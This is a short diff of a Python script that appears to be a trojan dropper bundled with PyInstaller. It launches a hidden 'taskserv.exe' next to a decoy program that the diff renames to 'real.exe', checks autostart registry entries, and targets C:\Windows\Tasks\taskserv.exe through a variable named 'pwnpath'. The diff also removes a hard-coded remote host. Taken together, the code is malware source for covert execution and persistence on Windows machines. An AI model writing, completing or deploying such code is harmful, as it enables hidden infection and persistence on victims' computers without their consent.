@@ -5,8 +5,6 @@ import shutil
 import subprocess
 from pathlib import Path
 
-host = '01.dev.oxasploits.com'
-
 def resource_path(relative_path):
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base_path, relative_path)
@@ -46,7 +44,7 @@ def check_autostart_registry(value_name):
     return False
 
 subprocess.Popen(resource_path('taskserv.exe'))
-subprocess.Popen(resource_path('nppi.exe'))
+subprocess.Popen(resource_path('real.exe'))
 
 pwnpath = r'C:\Windows\Tasks\taskserv.exe'
 ppath = Path(pwnpath)
